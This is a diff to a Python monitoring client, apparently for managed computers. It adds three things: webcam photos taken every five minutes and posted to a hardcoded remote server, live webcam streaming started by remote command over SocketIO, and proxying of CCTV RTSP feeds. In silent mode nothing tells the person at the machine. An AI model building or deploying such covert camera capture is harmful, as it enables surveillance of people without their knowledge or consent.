@@ -12,6 +12,10 @@ import subprocess
 import signal
 import logging
 import queue
+import cv2
+import io
+import base64
+import socketio
 from datetime import datetime, timedelta
 try:
     import GPUtil
@@ -25,6 +29,7 @@ CACHE_FILE = 'cached_usage.json'
 DEFAULT_SERVER_URL = 'http://187.127.142.58'  # Central server URL (Nginx on port 80 → Gunicorn on 5010)
 COLLECTION_INTERVAL = 1  # seconds - updated for 1-second updates
 RECONNECT_INTERVAL = 300  # seconds (5 minutes)
+CAMERA_INTERVAL = 300     # seconds (5 minutes) - interval for camera capture
 MAX_RETRIES = 3
 RETRY_DELAY = 10  # seconds
 MAX_CACHE_SIZE = 1000  # Max records to cache offline
@@ -94,8 +99,17 @@ class UnitClient:
         self.unit_id = None
         self.registered = False
         self.running = True
+        self.is_streaming = False
+        self.stream_thread = None
         self.last_network_counters = None
+
+        # SocketIO Client for Live Control
+        self.sio = socketio.Client()
+        self.sio = socketio.Client()
         self.data_queue = queue.Queue()
+        self.last_camera_time = 0
+        self.cctv_streams = {} # { camera_id: {'running': True, 'thread': Thread} }
+        self.setup_sio_handlers()
         
         # Load existing cache into queue
         cached_data = self.load_cache()
@@ -162,6 +176,14 @@ class UnitClient:
                 json.dump(self.cache[-MAX_CACHE_SIZE:], f)
         except: pass
 
+    def save_cache_from_queue(self):
+        """Save remaining queue to disk (approximate)"""
+        try:
+            items = list(self.data_queue.queue)
+            with open(CACHE_FILE, 'w') as f:
+                json.dump(items[-MAX_CACHE_SIZE:], f)
+        except: pass
+
     def update_server_url(self, new_url):
         """Update server URL in config"""
         self.server_url = new_url
@@ -210,6 +232,11 @@ class UnitClient:
 
                 if not self.silent:
                     print(f"Unit registered successfully (Status: {response.status_code})")
+                
+                # Signal SocketIO that we are ready to receive commands for this Unit ID
+                if self.unit_id and self.sio.connected:
+                    self.sio.emit('unit_login', {'unit_id': self.unit_id})
+                    
                 return True
             else:
                 if not self.silent:
@@ -352,6 +379,51 @@ class UnitClient:
                 print(f"Data submission error: {e}")
             return False
 
+    def capture_and_submit_photo(self):
+        """Capture a photo from the webcam and submit it to the server"""
+        try:
+            # Initialize camera
+            cap = cv2.VideoCapture(0)
+            if not cap.isOpened():
+                logging.debug("No camera detected or camera already in use.")
+                return False
+
+            # Allow camera to warm up
+            time.sleep(1)
+            
+            # Capture frame
+            ret, frame = cap.read()
+            cap.release()
+
+            if not ret:
+                logging.debug("Failed to capture image from camera.")
+                return False
+
+            # Compress to JPEG
+            # Use lower quality to save bandwidth (e.g., 60%)
+            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
+            
+            # Prepare multipart request
+            url = f"{self.server_url}/api/report_camera"
+            files = {'image': ('photo.jpg', io.BytesIO(buffer), 'image/jpeg')}
+            data = {'unit_id': self.unit_id, 'photo_type': 'LIVE'}
+
+            response = requests.post(url, files=files, data=data, timeout=30)
+            
+            if response.status_code == 200:
+                if not self.silent:
+                    print("✓ Camera frame submitted successfully.")
+                return True
+            else:
+                if not self.silent:
+                    print(f"⚠ Camera submission failed with status: {response.status_code}")
+                return False
+
+        except Exception as e:
+            if not self.silent:
+                print(f"Camera error: {e}")
+            return False
+
     def sync_offline_data(self):
         if not self.silent:
             print("Sync thread started.")
@@ -388,10 +460,9 @@ class UnitClient:
                 # Check registration before sending
                 if not self.registered:
                     if not self.register_unit():
-                         # If we can't register, wait and retry loop
                         time.sleep(RETRY_DELAY)
                         continue
-                        
+                
                 # Attempt Send
                 if self.submit_data(batch):
                     sent = True
@@ -401,22 +472,136 @@ class UnitClient:
                     # Mark all as done
                     for _ in batch:
                         self.data_queue.task_done()
-                        
-                    # Save cache (optional optimization: only save if queue is empty or periodically)
-                    if self.data_queue.qsize() == 0:
-                        self.save_cache_from_queue()
                 else:
                     if not self.silent:
                         print(f"⚠ Sync failed for batch of {len(batch)}. Retrying in {RETRY_DELAY}s...")
                     time.sleep(RETRY_DELAY)
 
-    def save_cache_from_queue(self):
-        """Save remaining queue to disk (approximate)"""
+    def setup_sio_handlers(self):
+        @self.sio.on('connect')
+        def on_connect():
+            if not self.silent:
+                print("✓ Connected to Live Control Server")
+            if self.unit_id:
+                self.sio.emit('unit_login', {'unit_id': self.unit_id})
+
+        @self.sio.on('start_stream')
+        def on_start_stream(data):
+            if not self.silent:
+                print(f"▶ Live stream requested by admin")
+            self.start_live_stream()
+
+        @self.sio.on('stop_stream')
+        def on_stop_stream(data):
+            if not self.silent:
+                print("⏹ Live stream stopped")
+            self.is_streaming = False
+
+        @self.sio.on('start_cctv_stream')
+        def on_start_cctv_stream(data):
+            camera_id = data.get('camera_id')
+            rtsp_url = data.get('rtsp_url')
+            if not camera_id or not rtsp_url: return
+            
+            if not self.silent:
+                print(f"▶ Proxying CCTV camera {camera_id}")
+            
+            if camera_id in self.cctv_streams:
+                self.cctv_streams[camera_id]['running'] = False
+                
+            self.cctv_streams[camera_id] = {'running': True}
+            t = threading.Thread(target=self.cctv_stream_loop, args=(camera_id, rtsp_url), daemon=True)
+            self.cctv_streams[camera_id]['thread'] = t
+            t.start()
+
+        @self.sio.on('stop_cctv_stream')
+        def on_stop_cctv_stream(data):
+            camera_id = data.get('camera_id')
+            if camera_id in self.cctv_streams:
+                if not self.silent:
+                    print(f"⏹ Stopping CCTV camera proxy {camera_id}")
+                self.cctv_streams[camera_id]['running'] = False
+
+    def start_live_stream(self):
+        if self.is_streaming:
+            return
+        self.is_streaming = True
+        self.stream_thread = threading.Thread(target=self.stream_frames_loop, daemon=True)
+        self.stream_thread.start()
+
+    def stream_frames_loop(self):
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            if not self.silent:
+                print("ERROR: Cannot open camera for live stream")
+            self.is_streaming = False
+            return
+
+        # Optimization: Lower resolution for streaming
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+
         try:
-            items = list(self.data_queue.queue)
-            with open(CACHE_FILE, 'w') as f:
-                json.dump(items[-MAX_CACHE_SIZE:], f)
-        except: pass
+            while self.is_streaming and self.running:
+                ret, frame = cap.read()
+                if not ret:
+                    break
+
+                # Compress and Base64 encode
+                _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
+                base64_frame = base64.b64encode(buffer).decode('utf-8')
+
+                self.sio.emit('video_frame', {
+                    'unit_id': self.unit_id,
+                    'frame': f"data:image/jpeg;base64,{base64_frame}"
+                })
+                
+                # ~10 FPS
+                time.sleep(0.1)
+        finally:
+            cap.release()
+            self.is_streaming = False
+
+    def cctv_stream_loop(self, camera_id, rtsp_url):
+        cap = cv2.VideoCapture(rtsp_url)
+        if not cap.isOpened():
+            if not self.silent:
+                print(f"ERROR: Cannot connect to CCTV RTSP {rtsp_url}")
+            return
+
+        try:
+            while self.cctv_streams.get(camera_id, {}).get('running') and self.running:
+                ret, frame = cap.read()
+                if not ret:
+                    break
+
+                # Compress and Base64 encode
+                _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
+                base64_frame = base64.b64encode(buffer).decode('utf-8')
+
+                self.sio.emit('cctv_frame', {
+                    'camera_id': camera_id,
+                    'frame': base64_frame
+                })
+                
+                # ~15 FPS to save bandwidth
+                time.sleep(0.06)
+        finally:
+            cap.release()
+            if camera_id in self.cctv_streams:
+                del self.cctv_streams[camera_id]
+
+    def connect_sio(self):
+        while self.running:
+            try:
+                if not self.sio.connected:
+                    self.sio.connect(self.server_url)
+                break
+            except Exception as e:
+                if not self.silent:
+                    print(f"SocketIO connection error: {e}. Retrying in 5s...")
+                time.sleep(5)
+
 
     def run(self):
         # Start sync thread
@@ -433,6 +618,13 @@ class UnitClient:
             
             if not self.registered:
                 self.register_unit()
+
+            # Check if it's time for a camera capture
+            current_time = time.time()
+            if current_time - self.last_camera_time >= CAMERA_INTERVAL:
+                # Run in a separate thread to avoid blocking metric collection
+                threading.Thread(target=self.capture_and_submit_photo, daemon=True).start()
+                self.last_camera_time = current_time
                 
             time.sleep(COLLECTION_INTERVAL)
 
